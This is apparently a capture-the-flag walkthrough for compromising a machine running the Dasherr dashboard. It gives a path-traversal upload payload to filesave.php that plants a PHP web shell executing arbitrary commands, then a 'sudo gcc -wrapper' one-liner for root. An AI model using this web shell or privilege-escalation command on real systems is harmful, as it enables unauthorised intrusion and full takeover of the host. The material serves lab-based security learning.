There is only one port, 8085

There is a dashboard app with a github repo link

https://github.com/erohtar/Dasherr/

When looking for known hacks for this software, we find this:

https://github.com/erohtar/Dasherr/security/advisories/GHSA-6rgc-2x44-7phq

So this means when we save the settings, it makes a POST request to filesave.php

We replace the content of the uploaded file with this:

Content-Disposition: form-data; name="file"

../shell.php
------WebKitFormBoundary3k4c9TpSnCO6m6ku
Content-Disposition: form-data; name="data"

<?php
echo "HackerFrogs rule! ";
system($_REQUEST['cmd']);
?>

The file can be found at the webroot directory

Once on the box, we see that we have sudo permissions with the gcc binary

sudo gcc -wrapper /bin/bash,-s .
